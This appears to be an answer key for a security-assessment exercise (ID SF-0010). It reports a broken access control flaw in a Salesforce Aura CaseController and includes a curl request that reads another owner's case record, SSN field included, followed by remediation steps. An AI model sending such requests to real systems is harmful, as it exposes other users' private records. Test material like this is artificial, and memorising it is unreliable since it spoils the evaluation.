# Expected Response

## System
- **Domain:** SaaS / Collaboration Platform (Salesforce-Integrated)
- **System:** TaskFlow Collaboration API (Salesforce-Integrated)
- **Example ID:** SF-0010

## Priority Findings

### Finding 1: SaaS Collaboration Salesforce — BAC Functional Pivot via Aura getCaseDetails Exposes Cross-Ownership Case Records (Pattern 2.1)
**Severity:** High
**Category:** Broken Access Control / Functional Pivot (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-010/RISK-SF-011): The `CaseController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 2.1 — functional pivot/vertical/horizontal): the Aura `getCaseDetails` action allows horizontal pivot between case records owned by other users by substituting the `caseId`. An attacker submitted `c.CaseController.getCaseDetails` with `caseId: "001D4E8"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-41-9351"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In SaaS Collaboration, exposure of case records enables competitive intelligence breach.

**Evidence from HAR:**
- Request: `POST https://340cd4e8.lightning.force.com/aura`
- Aura action descriptor: `c.CaseController.getCaseDetails`
- `aura.token`: `undefined`
- Params: `caseId: "001D4E8"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "001D4E8"`, `Name: "Victim Case Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-41-9351"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-010 | CaseController declared `without sharing` |
| context.txt §4.0 | RISK-SF-011 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 2.1 | Functional pivot — horizontal BAC via caseId substitution |
| HAR request | params.caseId | 001D4E8 — victim SaaS case ID |
| HAR response | SensitiveData__c | SSN: 000-41-9351 (PII) |

## Steps to Reproduce

### Step 1 — Aura caseId functional pivot SaaS (HAR)
```bash
curl -s -X POST 'https://340cd4e8.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"001D4E8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim SaaS case record including `SSN: 000-41-9351`. **Secure:** FORBIDDEN.

## Remediation
1. Declare `CaseController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Validate `aura.token`; server-side field allowlist.
